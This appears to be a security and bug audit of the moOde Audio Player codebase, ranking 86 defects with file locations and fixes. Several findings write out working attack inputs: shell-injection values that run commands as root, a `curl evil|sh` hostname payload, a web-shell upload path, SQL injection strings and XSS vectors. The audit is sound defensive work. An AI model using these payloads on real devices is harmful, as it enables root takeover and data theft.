# moOde Audio Player — Code Review Report

**Repository:** `/home/thanos/repos/moode.spacebunny`
**Branch:** `develop` @ `ee31f36b` (205 commits, tracks `moode-player/moode`)
**Review date:** 2026-10-18
**Scope:** PHP (backend + config screens), Python (daemons/utilities), Bash (scripts), JavaScript (front-end), systemd/nginx/udev configuration
**Reference architecture:** `../docs/moode_application.md`, `../docs/moode_source_tree.md`
**Change policy:** No existing code was modified. This document is the only file added.

---

## 1. Executive Summary

The review surfaced **86 verified defects** across all four language layers. The codebase is functionally mature and the architecture (documented in `moode_application.md`) is sound — the defects are almost entirely *local* implementation errors, not design flaws.

Three systemic root causes account for the majority of findings:

| Root cause | Symptoms | Findings |
|---|---|---|
| **R1. Shell escaping is done by hand, and `chkValue()` is a denylist that misses `" ' & \n ( )`** | Command injection via `$_POST`/`$_GET` reaching `sysCmd()` (which runs `sudo`) | 17 |
| **R2. SQL built by string concatenation; `SQLite3::escapeString()` applied inconsistently** | SQL injection, plus silent whole-table `UPDATE`/`DELETE` | 14 |
| **R3. Copy-paste and rename errors (typo'd keys, `=` for `==`, wrong variable, wrong index)** | Features silently disabled or misbehaving; daemon crashes | 21 |

Severity distribution:

| Severity | Count |
|---|---|
| Critical | 12 |
| High | 27 |
| Medium | 33 |
| Low | 14 |

**The single most important structural finding:** `etc/sudoers.d/010_www-data-nopasswd` grants `www-data` `NOPASSWD: ALL`, while `etc/sudoers.d/010_moode` disables sudo logging entirely. Because *every* helper (`sysCmd()`, `sysCmdStr()` in `www/inc/common.php:273-278`) wraps commands in `sudo`, each command-injection finding below is a **direct root compromise** with no audit trail. Fixing the injection sites matters far more than fixing them individually.

> **Note on the two `audiout` typos (§3.2, §3.13):** both were introduced by commit `5d494d7e` "Add Local audio ON/OFF option…", the most recent feature touching `worker.php`/`mpd.php`/`snd-config.php`. They are a fresh regression, not long-standing debt, and are worth a targeted follow-up before release.

---

## 2. Verification Method

Findings were not taken on faith. Each was checked against the source with at least one of:

- **Static analysis:** `php -l` (391 files), `python3 -m py_compile` + `pyflakes` (17 files), `shellcheck -S warning` (26 scripts), targeted greps for cross-file symbol consistency.
- **Executable reproduction** where practical. Confirmed by running code:
  - `killall -s 0 worker.php` → `worker.php: no process found` (rc=1) — proves `moodeutl -r` cannot restart the daemon.
  - `preg_match('/(\$|`|\||\;|<|>)/', 'x" & id & ')` → `int(0)` — proves `chkValue()` does not block `"` or `&`.
  - `StationManager(...).check_env(check_backup=True)` → `AttributeError: 'NoneType' object has no attribute 'execute'`.
  - `cdsp_volume_update.check_cdsp_statefile()` → `NameError: name 'cdsp' is not defined`.
  - `pirev.py -mb 000e` → `KeyError: 'mem_mb'`.
- **Cross-file consistency checks:** session/POST key typos confirmed by counting occurrences across the whole tree (e.g. `audiout` appears exactly once, in `www/inc/mpd.php:676`).
- **Git provenance:** `git log`/`git show` used to attribute the newest regressions to specific commits.

---

## 3. Critical Findings

### 3.1 Privilege model: `NOPASSWD: ALL` + logging disabled

**Files:** `etc/sudoers.d/010_www-data-nopasswd:1`, `etc/sudoers.d/010_moode:1-2`
```
www-data    ALL=(ALL) NOPASSWD: ALL
Defaults:root     !logfile, !syslog
Defaults:www-data     !logfile, !syslog
```
`www-data` is the nginx/php-fpm user executing every admin PHP page. Any PHP-level RCE, LFI, or malicious plugin is instantly full root. `sysCmd()` runs `exec('sudo LC_ALL=C ' . $cmd . ' 2>&1')`, so the rule is load-bearing — but it should be narrowed to a `Cmnd_Alias` allowlist (`/usr/local/bin/moodeutl`, `/usr/bin/systemctl`, `/usr/bin/amixer`, `/usr/bin/mpc`, `sqlite3` on the one DB path). The `Defaults` lines then disable all sudo logging, so every escalation leaves no record.

**Remediation:** Replace with a command allowlist; remove the `Defaults` lines so escalations are logged.

---

### 3.2 `chkValue()` denylist is the root cause of the injection class

**File:** `www/inc/common.php:132-170` (system-wide input filter)
```php
if (!empty($value) && preg_match('/(\$|`|\||\;|<|>)/', $value)) { ... }
...
foreach (SHL_CMDS as $cmd) { ... }   // SHL_CMDS = array('base64')  — constants.php:370
```
Blocked: `` $ ` | ; < > ``, `..`, and the literal string `base64`. **Not blocked:** `"`, `'`, `&`, newline, `(`, `)`, `*`, `#`, `/`, space.

Because the entire codebase escapes request data by *hand-wrapping it in `"`*, and `&`/newline are legal, every such site is escapable. Verified: `preg_match` on `x" & id & ` returns `0` (not blocked).

Several endpoints additionally **exclude** their parameter from validation entirely — those exclusions are what convert a filtered parameter into an unfiltered one:

| Endpoint | Excluded param | Reaches |
|---|---|---|
| `www/command/playlist.php:15-16` | `$_GET['item']`, `$_POST['path']` | `sysCmd('rm "' . … . '"')` at :206-207, `sysCmd('fgrep "' . $_GET['item'] . '"')` at :282 |
| `www/command/music-library.php:17` | `$_POST['name']` | `file_get_contents(LIBSEARCH_BASE . $_POST['name'] . '.json')` at :63 |
| `www/sys-config.php:22` | `$_POST['fs_smb_pwd']` | `sysCmd('echo -ne "' . $_SESSION['fs_smb_pwd'] . … )` at `worker.php:3647` |
| `www/command/audioinfo.php:14` | `$_GET['path']` | `sendMpdCmd($sock, 'lsinfo "' . … . '"')` — MPD is newline-delimited, so `\n` injects MPD commands |
| `www/net-config.php:15` | `wlan0ssid` | `sysCmd('wpa_passphrase "' . $ssid . '" …')` at `inc/network.php:222` |

`www/command/playlist.php:206` is the sharpest: `POST path=x"& id &"` runs `id` as root. `POST path=/../../var/www/js/playerlib` deletes arbitrary `.m3u` files.

**Remediation:** (a) add `" ' & \r \n \0` to the denylist; (b) audit and *remove* the exclusion lists, replacing them with per-field whitelist validation (`basename()` + `^[A-Za-z0-9 _.-]+$` for paths, `in_array()` against known option lists for commands); (c) replace hand-rolled `"…"` quoting with `escapeshellarg()` — `sysCmdSed()` (`common.php:281+`) already does this correctly and is the model to follow.

---

### 3.3 `setMpdHttpd()` — typo'd session key disables the "Local audio" feature

**File:** `www/inc/mpd.php:676`
```php
if ($_SESSION['mpd_httpd_local_audio'] == '1' && $_SESSION['audiout'] == 'Local') {
```
The session key is `audioout` everywhere else; `'audiout'` occurs **exactly once** in the tree. The condition is never true, so `setMpdHttpd()` always runs `mpc disable "ALSA Default"` when HTTP streaming is on. The "Local audio" option added in commit `5d494d7e` has no effect.

**Remediation:** `$_SESSION['audioout']`.

---

### 3.4 `chkRbActive()` — missing `== '0'` permanently disables RoonBridge handling

**File:** `www/daemon/worker.php:2246-2248`
```php
$rendererNotActive = ($_SESSION['btactive'] == '0' && $GLOBALS['aplactive'] == '0' && $GLOBALS['spotactive'] == '0'
    && $GLOBALS['qbzactive'] == '0' && $GLOBALS['slactive'] == '0' && $_SESSION['paactive']  // <-- no comparison
    && $_SESSION['rxactive'] == '0' && $GLOBALS['inpactive'] == '0');
```
Every peer is compared to `'0'`; `paactive` is bare. In PHP `'0'` is falsy, so when Plexamp is inactive (the normal case) `$rendererNotActive` is always `false`. RoonBridge output is therefore never recognised: no volume ramp/restore, no `rbactive1` front-end command, no screen-saver suppression, and stale `rbactive` is never cleared.

**Remediation:** `&& $_SESSION['paactive'] == '0'`.

---

### 3.5 `moodeutl -r` cannot restart `worker.php`

**File:** `usr/local/bin/moodeutl:462` (also :456, :458, :460)
```sh
sysCmd('killall -s 9 worker.php');
```
`worker.php` runs under `/usr/bin/php`, so its `comm` is `php`, not `worker.php`. Verified:
```
$ killall -s 0 worker.php
worker.php: no process found      (rc=1)
```
The kill silently no-ops. A restart can leave **two `worker.php` instances racing** on the SQLite DB and the `submitJob` queue — a live operational bug, not a theoretical one.

**Remediation:** Use a PID file (`worker.pid` is already written at `moodeutl:465`) or `pkill -f -x '/usr/bin/php /var/www/daemon/worker.php'`.

---

### 3.6 `worker.php` dies with a fatal `TypeError` when MPD is unreachable

**File:** `www/daemon/worker.php:1848-1853` (same pattern at :938-947, :973)
```php
if (false === ($sock = openMpdSock('localhost', 6600))) {
    workerLog('worker: CRITICAL ERROR: Post-startup actions: Connection to MPD failed');
}
$status = getMpdStatus($sock);   // $sock === false here
```
Every other call site uses `if (…) { … } else { … }`. Here failure is only logged, then `sendMpdCmd()` → `fputs(false, …)` throws `TypeError`, which `error_reporting(E_ERROR)` does **not** suppress. The worker dies before `wrkready` is set — the UI never comes up.

Same class: `www/inc/music-library.php:958-963` (`stopAutoShuffle()` logs but does not `return`), `www/command/index.php:78-81` (`turnOffAutoShuffle($sock)` called before `$sock` is assigned at :98/:121 — REST `play_item` fatals whenever auto-shuffle is on).

**Remediation:** Convert to `if (…) { workerLog(…); exit; } else { … }`, or `return` after logging.

---

### 3.7 `cdsp_volume_update.py` — `NameError` on the state-file creation path

**File:** `www/util/cdsp_volume_update.py:49, 54`
```python
if self._volume_state_file and self._volume_state_file.is_file() is False:
    logging.info('Create statefile %s', self._volume_state_file)
    cdsp.update_cdsp_statefile(0, False)     # `cdsp` is not in scope
```
There is no `cdsp` name — only `import camilladsp`; the instance is `self`. This is precisely the branch taken when the state file is missing/invalid, i.e. the function's main job, and the `NameError` is not caught by the `except FileNotFoundError/PermissionError` below. Reproduced: `CRASH: NameError name 'cdsp' is not defined`. The script runs on **every volume change**.

Compounding: the `elif` at :51 tests `.is_file()` without re-checking `self._volume_state_file is not None` → `AttributeError` when it is `None`.

**Remediation:** `self.update_cdsp_statefile(0, False)`; add the `None` guard to the `elif`.

---

### 3.8 `station_manager.py` — three defects break all error paths

**File:** `www/util/station_manager.py`

1. **:89 `except Error`** — `Error` is never imported (only `sqlite3`); the handler meant to report "Could not open SQL database" instead raises `NameError`. Fix: `except sqlite3.Error`.
2. **:116 `self.get_fields()` runs even when no connection was made** — when the DB is missing, `self.conn` stays `None` and line 116 dereferences it. Reproduced:
   ```
   Error: SQL database not found at '/tmp/nope.db'
   CRASH: AttributeError: 'NoneType' object has no attribute 'execute'
   ```
   The clean "DB not found" path (exit 4) always becomes a traceback. Fix: guard with `if self.conn is not None`, or early-return.
3. **:126-134 `check_backup()` clobbers the code and crashes on a missing file** — `return_code = 6` overwrites previously recorded errors (4/5/2), and `with ZipFile(self.backup_file, 'r')` sits *outside* the `else`, so a missing backup raises `FileNotFoundError` instead of exit code 6. This aborts `backup_manager.py --restore` (`backup_manager.py:343`). Fix: move the `with` inside the `else`.

**Plus a logic inversion** at :606-614 (see §4, `diff_backup` semantics).

**Remediation:** Apply all three fixes; each is a 1-3 line change.

---

### 3.9 `mpdconf_merge.py` silently discards directives it cannot parse

**File:** `www/util/mpdconf_merge.py:86, 123`
```python
else:
    InvalidLine("Invalid line nr %d: '%s'" %(linenr, linetxt))   # missing `raise`
```
Line 81 does `raise InvalidLine(...)`; the two other sites omit it — a copy-paste bug. Any directive the parser does not understand vanishes **without a warning**, and the merged `/etc/mpd.conf` is written anyway. Reproduced: a bogus unquoted line disappeared with exit 0. An unterminated scope at EOF loses all of its settings the same way (lines 70-73 only flush on `}`).

Secondary: `InvalidLine(BaseException)` at :25 means no `except Exception` in a caller will catch it; `foutput = open(filename, 'w')` at :90 rewrites `/etc/mpd.conf` non-atomically while MPD may be reading it.

**Remediation:** Add `raise` at both sites; derive from `Exception`; write to `filename + '.new'` then `os.replace()`.

---

### 3.10 `dashboard.php` — remote root RCE + stored XSS via a LAN peer's self-reported hostname

**File:** `www/dashboard.php:79, 97-101, 137`
```php
$host = $rxStatus[5];                        // from an HTTP response of a discovered host
sysCmd("echo -n '" . $_players . "' | sudo tee " . DASHBOARD_CACHE_FILE);
```
`sendTrxControlCmd($ipAddr, '-all')` queries every host found by the MPD port scan; field 6 of that host's response becomes `$host`, is `sprintf`'d unescaped into `data-host="%s"` / `>%s<`, and then interpolated **inside single quotes** into a `sudo tee` shell command. Any host on the LAN answering with `x'; curl evil|sh; echo '` gets root execution; a name containing `<img onerror=…>` is stored XSS in the Dashboard modal.

**Remediation:** `htmlspecialchars()` every field before HTML emission; replace the shell pipeline with `file_put_contents(DASHBOARD_CACHE_FILE, $_players)`.

---

### 3.11 Arbitrary file write → RCE via the CamillaDSP config upload

**File:** `www/cdsp-config.php:104-106`
```php
$configFileBaseName = $_FILES["pipeline_config"]["name"];
$configFileName = $cdsp->getConfigsLocationsFileName() $configFileBaseName;
move_uploaded_file($_FILES["pipeline_config"]["tmp_name"], $configFileName);
```
The client-supplied filename is used verbatim. `chkVariables()` never touches `$_FILES`, and there is no `basename()` or extension check. Uploading a file named `../../../var/www/html/shell.php` writes a PHP web shell.

**Remediation:** `$name = basename($_FILES[…]['name']); if (!preg_match('/^[A-Za-z0-9._-]+\.ya?ml$/', $name)) reject;`

---

### 3.12 `sqlRead()` interpolates unescaped values — full-table read/dump

**File:** `www/inc/sql.php:19-41`
```php
$queryStr = "SELECT * FROM " . $table . " WHERE id='" . $id . "'";
$queryStr = 'SELECT value FROM ' . $table . " WHERE param='" . $param . "'";
```
Unlike `sqlUpdate()` — which escapes every value — `sqlRead()` interpolates `$param`/`$id` raw. Reachable from request data at `www/command/cfg-table.php:101` and `:146`, and from `sqlRead('cfg_source', $dbh, '', …)`. `chkVariables()` does not reject single quotes; `chkSQL()` only blocks `"`, `--` and a keyword list. Executable test confirms `theme_name = nope' OR '1'='1` returns every row of `cfg_theme`; the same tautology against `cfg_system` dumps the whole settings table.

**Remediation:** Convert `sqlRead()` to prepared statements with bound parameters and drop the keyword blacklist as the security boundary.

---

## 4. High-Severity Findings

### Backend — PHP

| # | File:Line | Issue |
|---|---|---|
| H1 | `worker.php:3518, 3694, 3522, 3546` | Job args interpolated into root shell without `escapeshellarg()`. `chkValue()` lets `&` and newline through, so `timezone=UTC&reboot&` → `sudo … set-timezone UTC&reboot&` = root RCE. `cpugov` (`:3546`) additionally wraps user data in single quotes it can break out of. |
| H2 | `worker.php:463-465, 1530-1532` | Assignment written as comparison: `$_SESSION['eth0chk'] == '0';` and `$_SESSION['lcdup'] == '0';` are no-ops. The value is never stored, so the checks at `:473` and `:1533` read undefined keys — the Ethernet IP wait timeout and the LCD updater start are silently disabled on a fresh install. Fix: use `=`. |
| H3 | `worker.php:2950-2955` | Undefined `$file` in the `create_saved_search` job: `sysCmd('chmod 0777 "' . $file . '"')`. `$file` only exists in the unrelated `fs_nfs_access` case (`:3664`), so saved-search JSON is created mode 0644 and www-data cannot rewrite it. |
| H4 | `worker.php:2727-2734` | `$_SESSION[$song['file']]['name']` dereferenced at `:2731` **before** the `isset()` guard at `:2734`. Any non-`cfg_radio` HTTP stream reads an undefined key first. |
| H5 | `www/inc/common.php:512-526` | `sendFECmd()`: inside the retry loop `file()` can return `false`, and `count(false)` is a fatal `TypeError` in PHP 8. `PORT_FILE` is concurrently rewritten by `sed -i` in `engine-cmd.php:46` (unlink/rename), so this window is real. Also the `socket_connect()`-failure branch never calls `socket_close()` — one fd leaked per dead port. Fix: `$ports = file(…) ?: array();` and add `socket_close($sock)`. |
| H6 | `www/inc/alsa.php:237-238` | `$result = sqlQuery("SELECT value FROM cfg_system WHERE param='audioout'", …)` returns a **row list**; `$result['value']` is an undefined key, so the Bluetooth branch is dead code. Called on every now-playing update (`inc/mpd.php:901`) — with Bluetooth output the "Output" line reads the idle local card's `hw_params` and shows `Not playing`. Fix: `$result[0]['value']`. |
| H7 | `www/inc/cdsp.php:87-89` | `if (empty($ymlCfg['pipeline']) || …) { unset($ymlCfg['mixers']); }` — copy/paste from the `filters`/`mixers` blocks; should be `unset($ymlCfg['pipeline'])`. An empty `pipeline:` survives into the emitted YAML and CamillaDSP rejects it, while `mixers` is unset twice. Dead test code at `:743-751` confirms the intent. |
| H8 | `www/inc/autocfg.php:53-57, 79-87` | Auto-config import helpers interpolate values into SQL without `SQLite3::escapeString()`; a value containing `'` corrupts or rewrites the query. Route through `sqlUpdate()`/`sqlRead()`. |
| H9 | `www/engine-cmd.php:29-43` | `socket_read($sockres, 1024)` with no `socket_set_timeout()`: a client that connects and stalls blocks the helper forever, and its stale port stays in `PORT_FILE` so `sendFECmd()` burns its retries on it every time. `$sockres` is never closed; if `socket_accept()` returns `false`, `$cmd` is never set. |
| H10 | `www/command/cfg-table.php:136-138` | `foreach (array_keys($_POST) as $var) { phpSession('write', $var, $_POST[$var]); }` — no key whitelist, unlike every config screen. With no CSRF tokens anywhere, a cross-site POST can set `w_lock=1` (permanent "worker busy" DoS, since `submitJob()` then always fails) or overwrite `sessionid`, `hostname`, `volknob`. |
| H11 | `www/command/system.php:16-24` | `cmd=reboot` / `cmd=poweroff` / `cmd=update_library` are reachable over plain **GET**. `<img src="http://moode.local/command/system.php?cmd=poweroff">` shuts the player down; `dashboard.php:27-29` fans the call out to every discovered LAN player. |
| H12 | `www/command/radio.php:151-162, 171-182` | INSERT/UPDATE interpolate `$path['type']`, `['genre']`, `['broadcaster']`, `['language']`, `['country']`, `['region']`, `['bitrate']`, `['format']`, `['geo_fenced']`, `['monitor']`, `['id']` **unescaped** (only `url`, `name`, `home_page` are escaped). The INSERT has no `WHERE`, so `chkSQL()` sees `No WHERE clause` and performs **no check at all**. Full column-overwrite SQL injection via `POST path[language]=…`. |
| H13 | `www/command/radio.php:279-290` | `putRadioViewShowHide()`: the `if/else if` chain over `$stBlock` has **no final `else`**, so an unexpected `block` value leaves `$whereClause` undefined → `UPDATE cfg_radio SET type='f'` with **no WHERE**, promoting every station to a favorite. `$stType` is also unescaped. |
| H14 | `www/command/radio.php:63` | `sysCmd('/var/www/daemon/mpdmon.php "' . $_POST['opt'] . '" > /dev/null 2>&1 &')` — `opt` is only `chkValue()`d; `"` and `&` are legal. Add `escapeshellarg()`. |
| H15 | `www/command/playlist.php:482-497` | `markItemAsFavorite()` builds `WHERE station='" . $item . "'` **without** `SQLite3::escapeString()`, unlike the neighbouring queries at `:188` and `:363`. `$_GET['item']` is excluded from validation. |
| H16 | `www/trx-config.php:54,58,108,117,127,134,153,162,175` + `www/inc/multiroom.php:20-28` | ~12 unescaped `UPDATE cfg_multiroom SET value='" . $_POST['…'] . "'` statements. Worse, the stored value is later interpolated **unquoted** into a root shell command (`inc/multiroom.php:22`) — `multiroom_tx_host=239.1.1.1 & id &` is root RCE on the next sender start. |
| H17 | `www/eqg-config.php:15,42` | `$_GET` is **never** validated in this file, and `sysCmd('amixer -D alsaequal cset numid=' . $i . ' ' . $_POST['freq' . $i])` interpolates a POST value → `freq1=50% & id &` is root RCE. `:62` also interpolates `$_GET['curve']` into SQL. |
| H18 | `www/eqp-config.php:97-98` → `www/inc/eqp.php:88` | `$_GET['curve']` (never validated) → `'SELECT settings from ' . $table . ' where id = '. $index . ';'` unquoted and uncast. `chkSQL()` only *warns* on `union `/`select `, so `?curve=0 UNION SELECT value FROM cfg_system` succeeds and is rendered back into the page. Fix: `intval()`. |
| H19 | `www/blu-config.php:24-25,145` + `:46,52,59,62,72,99,108,115,123` | `btcmd` is never checked against the documented option list (`-s -p -c -l -D -R -H`, enumerated at `:130-136`); four more sites interpolate `scanned_device`, `pcm_buffer`, `sbc_quality` into `sudo` commands and `sed -i` edits of `/etc/bluealsaaplay.conf` and the `bluealsa.service` unit. |
| H20 | `www/lib-config.php:279,285` → `www/inc/music-source.php:466` | `nvme_drive` passes `chkValue()` (which permits `&`) into `sysCmd('mkfs -t ext4 ' . $device)` and `e2label`. Root RCE **plus** `mkfs` on an attacker-chosen device. Fix: strict `#^/dev/nvme\d+n\d+(p\d+)?,[A-Za-z0-9 _-]+$#` + `escapeshellarg()`. |
| H21 | `www/command/music-library.php:17,63,66,74` | `name` excluded from validation → `file_get_contents(LIBSEARCH_BASE . $_POST['name'] . '.json')` (contents echoed verbatim) and `sysCmd('rm "' . … . '"')`. Path traversal read/write/delete as root. |
| H22 | `www/mpd-config.php:27` | No `chkKey()` whitelist on `cfg_mpd`, unlike `qbz-config.php:34`, `spo-config.php:17`, `sqe-config.php:18`, `apl-config.php:18`, `rcp-config.php:47`, `upp-config.php:21`. Arbitrary `cfg_mpd` rows can be created or `device`/`mixer_type`/`dop` overwritten. |
| H23 | `www/gpio-config.php:14,19-25` | `chkVariables($_POST['config'])` warns if absent; then every client-chosen key is written to `cfg_gpio` with no whitelist of the 8 button ids + 99 and no enum validation of `enabled`/`pin`/`pull`. The `command`/`param`/`value` columns are consumed by the GPIO daemon → persistent config injection. |
| H24 | `www/command/camilla.php:21,25` (+ `snd-config.php:327`, `cdsp-config.php:30`) | `cdspconfig` is validated against `getAvailableConfigs()` in `command/index.php:169-178` but **not** in these three. `selectConfig()` then runs `sysCmd("ln -s -f \"" . $configFileName . "\" …")`. |
| H25 | `www/per-config.php:257-260` | Wrong key passed as the job argument: `submitJob('rotenc', $_POST['rotaryenc'])` inside the `rotenc_params` handler (the correct call is at `:253`). `rotaryenc` is undefined, so the worker gets the wrong value. Fix: `$_POST['rotenc_params']`. |
| H26 | `www/inc/common.php:441,477-478` + `www/header.php:164` | Reflected XSS via the `Referer` header: for screens whose `$tpl` is not in `$tplConfigs` (`peppy-config.php`, `inp-config.php`, `rcp-config.php`), an attacker-supplied `Referer` is stored verbatim in `$_SESSION['config_back_link']` and echoed into an unescaped `href` on the same request. |
| H27 | `www/inc/common.php:424-437` (`uiNotify`) | `$script .= "text: '" . $notify['msg'] . "',";` — any message containing `'` breaks out of the JS string literal. `trx-config.php:103` sets it from `$rxStatus[5]`, which is **returned by other LAN hosts** → remote, unauthenticated XSS. `sys-config.php:42` injects data fetched from the update server. Fix: `json_encode()`. |

### Front-end — JavaScript

| # | File:Line | Issue |
|---|---|---|
| H28 | `www/js/playerlib.js:1356-1360, 1394-1395, 1400-1401, 1696-1697` | Unguarded `RADIO.json[MPD.json['file']]` lookups in `renderUI()` / `genSearchUrl()`. `renderPlayqueue()` guards the same lookup (`:1871`, `:1905`); `renderUI()` does not. Any stream not in `cfg_radio` (Radio Browser station that failed to register, ad-hoc/UPnP URL) throws `TypeError` inside the `engineMpd()` callback, **outside** the `try` that wraps only `JSON.parse` — the recursive `engineMpd()` at `:372` is never reached and the polling loop dies silently. UI frozen forever, no reconnect overlay. |
| H29 | `www/js/playerlib.js:314-373, 545-757` | `engineMpd()`, `engineCmd()` and `engineMpdLite()` have no exception guard around parsing/dispatch. A truncated response or any throwing handler aborts the callback before the re-arm line, permanently stopping the command engine (renderer status, `reset_view`, `set_cover_image`, `libupd_done` all stop working, with no error shown). |
| H30 | `www/js/playerlib.js:426-437` (+ `:487-496`, `:521-536`) | Reconnect detection is effectively dead: `data['readyState'] == 0` is true only after `abort()`, but on a network error the XHR `readyState` is 4. So `renderReconnect()` never runs and the user gets a silently frozen UI instead of the Reconnect screen. Additionally `engineMpdLite()`'s `setTimeout(function(data){…})` at `:487` is invoked with no argument, so its `typeof(data) !== 'undefined'` test is always false. |
| H31 | `www/js/playerlib.js:5368` | `var coverUrl = data[i][key] = '' ? DEFAULT_ALBUM_COVER : …` — assignment instead of comparison. This **assigns `''`** to `data[i]['Covers']` (the md5 hash from `command/audioinfo.php:104`) and then tests the emptied value, so the ternary always takes `DEFAULT_ALBUM_COVER`. Album art never appears in the Track/Playback info modal, and the hash is destroyed. Fix: `==`. |
| H32 | `www/js/playerlib.js:2455-2466, 2567-2570, 1696-1697` | XSS/HTML injection: `data-path` and the visible `station-name` are emitted **raw** while sibling attributes use `rbEscapeHtml()` (`:2455`). Playlist names come from user M3U files and are equally raw. `home_page` goes into an `href` unescaped. `cfg_radio`/`cfg_playlist` values are not `htmlspecialchars()`-ed server-side. |
| H33 | `www/js/radio-browser.js:314-326` | Third-party radio-browser.info **genre** data is injected raw into both an attribute and element content, while the country list two functions above correctly uses `rbEscapeHtml()`. A spoofed/compromised API yields script execution in the admin UI. |
| H34 | `www/js/playerlib.js:927-934, 940-951, 955-956, 961` | Renderer metadata (AirPlay/Spotify/Bluetooth/Qobuz artist/title/album/coverURL) is concatenated raw and injected via `.html()`. These strings come from an arbitrary LAN renderer and are not escaped server-side (unlike MPD tags), so any device on the LAN can inject HTML/script or break out of the `src="…"` attribute. |
| H35 | `www/js/scripts-library.js:1692` | `var headingKey = $(this).attr('heading-mb-album-id');` — but `renderSongs()` writes `heading-key` (`:807`, `:822`), and the Disc handler at `:1666` reads `heading-key` correctly. With `headingKey === undefined` the whole `matchAlbum` expression is false, so `filteredSongsAlbum` stays empty whenever the album key includes MBRZ AlbumID (`miscLibOptions[1] == 'Yes'`), and **Add/Play/Clear-Play/Add-to-playlist from an album heading queues zero tracks**. |

### Python

| # | File:Line | Issue |
|---|---|---|
| H36 | `www/util/aplmeta.py:234-240` | `while True: line = sys.stdin.readline()` with no EOF check. When shairport-sync/the reader closes stdin, `readline()` returns `''` forever and the loop **spins at 100% CPU** for the life of the process. Fix: `if line == '': break`. |
| H37 | `www/util/aplmeta.py:269-314` | The entire metadata publish block (`send_fecmd`, state/bundle reset, `last_*` update) sits inside the `else` of `if not cover_path`. If no cover file exists, nothing is published and `bundle` is never set to `'end'` — so the **next** `Source Format` line no longer ends the bundle and *all subsequent track metadata for that session is silently dropped*. One missing cover wedges AirPlay metadata. Fix: move the block out of the `else`. |
| H38 | `www/util/rotenc.py:168-170` | `mpd_cli.connect()/setvol()/disconnect()` are unguarded inside the `while True` poll loop. MPD restarts on every source change; `ConnectionRefusedError`/`OSError` propagates out and **kills the rotary-knob daemon**. |
| H39 | `www/util/rotenc.py:120-135` vs `:105-110` | `update_volume()` (sqlite write + full TCP connect/disconnect to MPD) is called **while holding `thread_lock`**, so the RPi.GPIO ISR thread blocks on `acquire()` and encoder edges are lost; a hung MPD blocks the ISR indefinitely. Fix: compute the delta under the lock, apply it outside. |
| H40 | `www/util/station_manager.py:606-614` vs `:358-362` | Diff-backup semantics are inverted. `do_import()` treats `stations_deleted` as "delete from target" and `stations` as "insert/update", but the two sets are swapped: applying a diff backup **deletes** the stations that should have been added and **re-imports** those that should have been removed. Fix: `stations = missing_stations_db + stations_with_difference`; `stations_deleted = additional_stations_db`. |
| H41 | `www/util/station_manager.py:431-433, 437-455` | Station names from an (untrusted) backup zip are used in `os.path.join(...)` and inside `os.system('ffmpeg … "{}" …')`. A name containing `../` escapes the target directory (writing arbitrary `.jpg` as root); a name containing `"`/`$(…)` breaks the shell quoting → **root command execution** during `station_manager.py --import` / `backup_manager.py --restore`. |
| H42 | `www/util/backup_manager.py:86` | `system('sed -i "s/wlanpwd = .*/wlanpwd = \\"{}\\"/g" {}')` — a password containing `"`, `` ` `` or `$(…)` executes arbitrary commands as root (backup/restore runs as root). |

### Bash / system

| # | File:Line | Issue |
|---|---|---|
| H43 | `www/util/gen-cert.sh:8-9, 35` | Runs as root (`worker.php:1359`). `OPENSSL_CFG_FILE=/tmp/moode-selfsigned.conf` is a **predictable filename in world-writable `/tmp`** — an unprivileged local user can pre-create it as a symlink and root will append attacker content to any file. Also uses `>>` not `>`, so every re-run accumulates duplicate `[ req ]` sections (last block wins → stale CN silently discarded) and the file grows unboundedly. Fix: `mktemp` + `trap 'rm -f "$cfg"' EXIT`, write with `>`. |
| H44 | `www/util/system-updater.sh:51-57`, `www/util/plugin-updater.sh:48-52` | `wget … update-$1.zip` → `unzip` → `update$MOODE_SERIES/install.sh` **as root**, with no checksum or signature verification, from a URL read out of the (admin-editable) DB. A MITM or DNS-hijacked host yields root code execution. Fix: pin and verify a SHA-256 before `unzip`. |

---

## 5. Medium-Severity Findings

### Backend — PHP
- **M1** `www/inc/queue.php:22-28` — `$queue[$idx]['TimeMMSS'] = formatSongTime($queue[$idx]['Time'])` runs when the `file:` line is parsed, but `Time` has not been read yet (MPD emits `file:` first in each entry). `Undefined array key "Time"`; the result is always `"00:00"`. `www/inc/mpd.php:601` has the same expression but sits in the per-tag branch and is recomputed correctly.
- **M2** `www/inc/mpd.php:496-522` — `explode(':', $status['time'])` at `:496` runs **before** the stop-state check; MPD omits `time` when stopped, so this is an undefined-key read, and `:521-522` then unconditionally overwrite the `'0'` values just set in the stop branch.
- **M3** `www/inc/music-source.php:204-207` — `if (count($parts) >= 2) { $version = trim($parts[2]); }` — the guard permits `count == 2` but indexes element `2`. A two-element result yields `''`, silently falling back to the default SMB protocol.
- **M4** `www/inc/peripheral.php:156-160` — `$itemList` is undefined when the Peppy meter/spectrum folder has no `[name]` entries; `rtrim(null, ', ')` emits a PHP 8.1+ deprecation. Initialise `$itemList = '';`.
- **M5** `www/command/playlist.php:293, 299-302` — `getPlaylistContents($_POST['path'])` with `path` excluded from validation → `path=../../etc/mpd` opens and parses an arbitrary file outside the playlists directory. Also `html_entity_decode()` is applied inconsistently (`:374` vs `:166`/`:180`).
- **M6** `www/command/audioinfo.php:14,22` — `path` excluded; `escapeDblQuotes()` handles `"` but **not** `\n`, and MPD is newline-delimited → a newline injects arbitrary MPD commands (`delete`, `load`, …).
- **M7** `www/command/queue.php:43,48,56,60` — `songpos`/`range`/`newpos` reach `sendMpdCmd()` after only `chkValue()`, which permits newlines. Same MPD protocol-injection class. Fix: `intval()`.
- **M8** `www/command/multiroom.php:49-64` — `$_POST['item']` used as an array index into `explode(' ', $_SESSION['rx_addresses'])` with no bounds check, and `$_POST['onoff']` is concatenated into the command sent to the receiver.
- **M9** `www/command/playback.php:33` — `volknob` is only `chkValue()`d and is also written to the session unvalidated, then interpolated into `amixer … ' . $_POST['volknob'] . '%'`. Fix: `(int)` + range check.
- **M10** `www/command/playback.php:61-66, 83-87` — `toggle_value` written straight to `$_SESSION['ashuffle']`/`['toggle_coverview']`, and at `:71` the latter is concatenated into `sysCmd('/var/www/util/coverview.php ' . …)`.
- **M11** `www/command/radio-browser.php:20-21, 28, 202` — `$_REQUEST` is used where only `$_GET`/`$_POST` were validated; `$_REQUEST` also sources **cookies**, which `chkVariables()` never inspects. `rbServeLogo($_REQUEST['url'])` additionally performs a server-side fetch of an arbitrary `http(s)://` URL (SSRF).
